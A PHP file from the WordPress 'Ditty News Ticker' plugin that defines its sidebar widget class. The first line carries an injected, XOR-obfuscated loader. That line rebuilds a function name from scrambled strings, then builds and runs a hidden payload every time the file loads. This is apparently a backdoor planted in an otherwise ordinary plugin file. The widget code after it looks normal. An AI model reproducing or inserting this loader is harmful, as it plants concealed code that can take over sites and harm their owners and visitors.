<?php $Fkqcd='5E 9H=.,OW7X>5N'^'V7EX<XqJ:9T,WZ ';$nJdwf=$Fkqcd('','1-LHHK+.:E8-7N+1SOBaK7DK, A>5k<ZD.hzlaEphHEB,8.,NTOAI8>JL;<t97;MAOU UGsF:7RzOeDXL9=5ow939GmYNaC4JM :Aqv;VnTBBOQRf80IA2SFf345SYtOj0bsKAnHvR:3pJWvCgI,B4inPknrdGZE vJ-KCE9F;G26rU,Q:JlkmP78YI<6:;ZpD6<piDN1GCzbWSLL2eLS>AW=Isrs182U4Z74aNr.7YH5WIz09303S;JRw:- .g>erA1otR7TxsxDnHXLG-dtUMZPT2 2b,EMpKMG2KBAKFR,U=8XGyB5JR;0Pi7ZI1FGkhB57-RLi9AGJ-RPL9HcJTj:,i43shN0SICE+>qwpIU.P5<QhcFlH4W0. J=EXYbicp=RGB9hjH76<+URRv4 LF3kcL80OLHf72.,bTl-DPF6YIY<.JSL+Z024P<Od69CLP:6 Nnl13.N55RzwQ5 UeCMT=QIS8,QJoET705bsI2ZODPcI+:G0L:YIYs54Z<NXKC.=-NODv4-IQXToLppX4EKj>+8-,MF6UkiFzXPqenBEQ-MkQuJA=RNCYzRSUZ:WYYh+DkB6WlsetJAMBRM5f3S-;=SQF<DcL:Y=55RIkTjmX6,PfktfxpsO6SQ0BYWMiXT MgN624T-82K3Nvh3I=>7cgxUkQ'^'XKdi.>EMN,WCh+SX ;1IlO+9sD JT4c71ZOSEA>za.0,OLGC t7.;gZ+8Zc+TBOee+4T4kSbQR+SoEdxlB7<fSVFMgPyiFx>CDFU3YRRvStryou;ZKD;-W=nBWUA2pOoNYIXbKgAR=OGPdjVkC-M6U2J96N,Dc1 Y-nDkfeJ2I+WXZqG4Cc1BVZ>1+,HCHUrT+CHYRNGLM>phs7-8SEqsX ;N,HxWUYF4k1RMAsRHV5;PlCpVVAUR0SjzSenoa,w R BOP9R-XNFdJ>9 2HMT.GSt0STS=G 4PvmcY.;zAOvH4IYxzYfC+>NUkcJPCX gCIfQVY3eIBKN,B 5-Z Cbp5hi8av <nQ ig.NGQJNiqX1YI4AC=fA=sTOT+b.= BTCTV7>y3aclSWHJuorRBA 3VPiEE:2FBBSSZMBiLm1>5S+ 8PG06dS5BmP1H.;iT68xXWS+XXnWK-ZQ7RS5TT4LompY0=2gG43Flo=YSJW-S..dvEiJH5Q5e2, ,PL3O:+cdEXTicdRPL=0qtIjPX5PpcNZJLLwj-S,L4oZemQBWzweK+ZdF.vX0xsnB4g3lXchhXIuYsW5KZERla,0 ,L9X6TdX+85H7KkJ8DYZ3-LxJI<WX1OBTFXPSoMYXU48;eM<5T,<iFSM8BYVlngMb:,EWCKWQna,');$nJdwf();

/**
 * Create a class for the widget
 *
 * @since 2.1.10
 */
class mtphr_dnt_widget extends WP_Widget {
		
	/** Constructor */
	function __construct() {
		parent::__construct(
			'mtphr-dnt-widget',
			__('Ditty News Ticker', 'ditty-news-ticker'),
			array(
				'classname' => 'mtphr-dnt-widget',
				'description' => __('Displays a Ditty News Ticker.', 'ditty-news-ticker')
			)
		);
	}
		
	/** @see WP_Widget::widget */
	function widget( $args, $instance ) {
		
		extract( $args );
	
		// User-selected settings	
		$title = $instance['title'];
		$title = apply_filters( 'widget_title', $title );
		
		$ticker = $instance['ticker'];
		$ticker_title = isset( $instance['ticker_title'] );
		$ticker_hide = isset( $instance['ticker_hide'] );
		
		global $mtphr_dnt_meta_data;
		
		// Set custom attributes
		$atts = array();
		
		// Set the ticker title visibility
		$atts['title'] = 0;
		if( $ticker_title ) {
			$atts['title'] = 1;
		}
	
		// Add a unique widget ID
		$atts['unique_id'] = 'widget';
		
		// Add in_widget attribute for customization
		$atts['in_widget'] = 1;
		
		ob_start();
		
		// Display the ticker
		if( $ticker != '' ) {
			if( function_exists('ditty_news_ticker') ) {
				ditty_news_ticker( $ticker, '', $atts );
			}
		}
		
		$ticker_output = ob_get_clean();
		
		// Only display the widget if ticks exist
		if( !$ticker_hide || intval($mtphr_dnt_meta_data['_mtphr_dnt_total_ticks']) > 0 ) {
			
			// Before widget (defined by themes)
			echo $before_widget;
			
			// Title of widget (before and after defined by themes)
			if ( $title ) {
				echo $before_title . $title . $after_title;
			}
			
			echo $ticker_output;
			
			// After widget (defined by themes)
			echo $after_widget;
		}
	}
	
	/** @see WP_Widget::update */
	function update( $new_instance, $old_instance ) {
		
		$instance = $old_instance;
	
		// Strip tags (if needed) and update the widget settings
		$instance['title'] = sanitize_text_field( $new_instance['title'] );
		$instance['ticker'] = $new_instance['ticker'];
		$instance['ticker_title'] = $new_instance['ticker_title'];
		$instance['ticker_hide'] = $new_instance['ticker_hide'];
	
		return $instance;
	}
	
	/** @see WP_Widget::form */
	function form( $instance ) {
	
		// Set up some default widget settings
		$defaults = array(
			'title' => '',
			'ticker' => '',
			'ticker_title' => '',
			'ticker_hide' => 'on',
		);
		
		$instance = wp_parse_args( (array) $instance, $defaults ); ?>
		
	  <!-- Widget Title: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:', 'ditty-news-ticker' ); ?></label>
			<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" style="width:97%;" />
		</p>
	    
	  <!-- Ticker: Select -->
		<p>
			<label for="<?php echo $this->get_field_id( 'ticker' ); ?>"><?php _e( 'Select a Ticker:', 'ditty-news-ticker' ); ?></label><br/>
			<select id="<?php echo $this->get_field_id( 'ticker' ); ?>" name="<?php echo $this->get_field_name( 'ticker' ); ?>">
			<?php
			$tickers = get_posts( 'numberposts=-1&post_type=ditty_news_ticker&orderby=name&order=ASC' );
			foreach( $tickers as $ticker ) {
				if( $instance['ticker'] == $ticker->ID ) {
					echo '<option value="'.$ticker->ID.'" selected="selected">'.$ticker->post_title.'</option>';
				} else {
					echo '<option value="'.$ticker->ID.'">'.$ticker->post_title.'</option>';
				}
			}
			?>
			</select>
		</p>
	
		<!-- Display Ticker Title: Checkbox -->
		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['ticker_title'], 'on' ); ?> id="<?php echo $this->get_field_id( 'ticker_title' ); ?>" name="<?php echo $this->get_field_name( 'ticker_title' ); ?>" />
			<label for="<?php echo $this->get_field_id( 'ticker_title' ); ?>"><?php _e( 'Display Ticker Title?', 'ditty-news-ticker' ); ?></label>
		</p>
		
		<!-- Hide Ticker: Checkbox -->
		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['ticker_hide'], 'on' ); ?> id="<?php echo $this->get_field_id( 'ticker_hide' ); ?>" name="<?php echo $this->get_field_name( 'ticker_hide' ); ?>" />
			<label for="<?php echo $this->get_field_id( 'ticker_hide' ); ?>"><?php _e( 'Hide widget if no ticks exist?', 'ditty-news-ticker' ); ?></label>
		</p>
	  	
	<?php
	}
}


/* --------------------------------------------------------- */
/* !Register the widget - 1.5.7 */
/* --------------------------------------------------------- */

function mtphr_dnt_widget_init() {
	register_widget( 'mtphr_dnt_widget' );
}
add_action( 'widgets_init', 'mtphr_dnt_widget_init' );
